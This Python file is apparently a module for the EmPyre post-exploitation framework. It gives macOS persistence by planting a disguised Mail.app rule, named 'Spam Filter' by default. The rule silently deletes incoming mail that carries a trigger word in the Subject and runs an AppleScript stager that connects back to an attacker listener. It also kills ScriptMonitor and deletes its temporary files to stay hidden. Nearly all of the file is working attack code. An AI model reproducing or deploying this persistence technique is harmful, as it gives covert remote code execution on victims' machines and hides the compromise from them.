# THIS IS A MODULE TO BE USED WITH EMPYRE
from time import time
from random import choice
from string import ascii_uppercase
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Mail',

            # list of one or more authors for the module
            'Author': ['@n00py'],

            # more verbose multi-line description of the module
            'Description': ('Installs a mail rule that will execute an AppleScript stager when a trigger word is present in the Subject of an incoming mail.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # list of any references/other comments
            'Comments': ['https://github.com/n00py/MailPersist']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LittleSnitch' : {
                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'RuleName' : {
                'Description'   :   'Name of the Rule.',
                'Required'      :   True,
                'Value'         :   'Spam Filter'
            },
            'Trigger' : {
                'Description'   :   'The trigger word.',
                'Required'      :   True,
                'Value'         :   'Harambe'
            }
        }
#
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

        ruleName = self.options['RuleName']['Value']
        trigger = self.options['Trigger']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        LittleSnitch = self.options['LittleSnitch']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
        launcher = launcher.replace('"', '\\"')
        launcher = launcher.replace('"', '\\"')
        launcher = "do shell script \"%s\"" % (launcher)
        hex = '0123456789ABCDEF'
        def UUID():
            return ''.join([choice(hex) for x in range(8)]) + "-" + ''.join(
                [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(4)]) + "-" + ''.join(
                [choice(hex) for x in range(4)]) + "-" + ''.join([choice(hex) for x in range(12)])
        CriterionUniqueId = UUID()
        RuleId = UUID()
        TimeStamp = str(int(time()))[0:9]
        SyncedRules = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
        RulesActiveState = "/tmp/" + ''.join(choice(ascii_uppercase) for i in range(12))
        AppleScript = ''.join(choice(ascii_uppercase) for i in range(12)) + ".scpt"
        plist = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <array>
        <dict>
        		<key>AllCriteriaMustBeSatisfied</key>
        		<string>NO</string>
        		<key>AppleScript</key>
        		<string>''' + AppleScript + '''</string>
        		<key>AutoResponseType</key>
        		<integer>0</integer>
        		<key>Criteria</key>
        		<array>
        			<dict>
        				<key>CriterionUniqueId</key>
        				<string>''' + CriterionUniqueId + '''</string>
        				<key>Expression</key>
        				<string>''' + str(trigger) + '''</string>
        				<key>Header</key>
        				<string>Subject</string>
        			</dict>
        		</array>
        		<key>Deletes</key>
        		<string>YES</string>
        		<key>HighlightTextUsingColor</key>
        		<string>NO</string>
        		<key>MarkFlagged</key>
        		<string>NO</string>
        		<key>MarkRead</key>
        		<string>NO</string>
        		<key>NotifyUser</key>
        		<string>NO</string>
        		<key>RuleId</key>
        		<string>''' + RuleId + '''</string>
        		<key>RuleName</key>
        		<string>''' + str(ruleName) + '''</string>
        		<key>SendNotification</key>
        		<string>NO</string>
        		<key>ShouldCopyMessage</key>
        		<string>NO</string>
        		<key>ShouldTransferMessage</key>
        		<string>NO</string>
        		<key>TimeStamp</key>
        		<integer>''' + TimeStamp + '''</integer>
        		<key>Version</key>
        		<integer>1</integer>
        	</dict>
        </array>
        </plist>'''
        plist2 = '''<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
        	<key>''' + RuleId + '''</key>
        	<true/>
        </dict>
        </plist>
        	'''
        script = """
import os
home =  os.getenv("HOME")
AppleScript = '%s'
SyncedRules = '%s'
RulesActiveState = '%s'
plist = \"\"\"%s\"\"\"
plist2 = \"\"\"%s\"\"\"
payload = \'\'\'%s\'\'\'
payload = payload.replace('&\"', '& ')
payload += "kill `ps -ax | grep ScriptMonitor |grep -v grep |  awk \'{print $1}\'`"
payload += '\"'
script = home + "/Library/Application Scripts/com.apple.mail/" + AppleScript

os.system("touch " + SyncedRules)
with open(SyncedRules, 'w+') as f:
    f.write(plist)
    f.close()

os.system("touch " + RulesActiveState)
with open(RulesActiveState, 'w+') as f:
    f.write(plist2)
    f.close()

with open(script, 'w+') as f:
    f.write(payload)
    f.close()

if os.path.isfile(home + "/Library/Mobile Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist"):
    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mobile\ Documents/com~apple~mail/Data/V3/MailData/ubiquitous_SyncedRules.plist")
else:
    os.system("/usr/libexec/PlistBuddy -c 'Merge " + SyncedRules + "' " + home + "/Library/Mail/V3/MailData/SyncedRules.plist")

os.system("/usr/libexec/PlistBuddy -c 'Merge " + RulesActiveState + "' "+ home + "/Library/Mail/V3/MailData/RulesActiveState.plist")
os.system("rm " + SyncedRules)
os.system("rm " + RulesActiveState)

        """ % (AppleScript, SyncedRules, RulesActiveState, plist, plist2, launcher)
        return script